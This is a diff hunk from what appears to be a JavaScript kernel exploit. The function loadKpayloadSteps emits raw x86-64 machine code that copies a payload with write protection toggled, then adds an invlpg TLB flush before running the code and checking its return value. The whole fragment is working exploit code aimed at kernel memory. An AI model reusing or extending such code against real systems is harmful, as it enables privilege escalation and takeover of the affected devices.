@@ -1229,6 +1229,8 @@ async function loadKpayloadSteps(k, kbase, room) {
   hex("b9"); i32(blob.length);
   hex("fc"); hex("f3a4");
   wpOn();
+  hex("48b8"); q64(t);        // mov rax, kbase+GH.rvaPad
+  hex("0f0138");              // invlpg [rax] -- flush stale TLB entry after paddingRW
   hex("b8"); i32(0x5758); hex("c3");
   const cp = fire();
   if (cp !== 0x5758) { say("[kp] copy returned 0x" + cp.toString(16)); return false; }
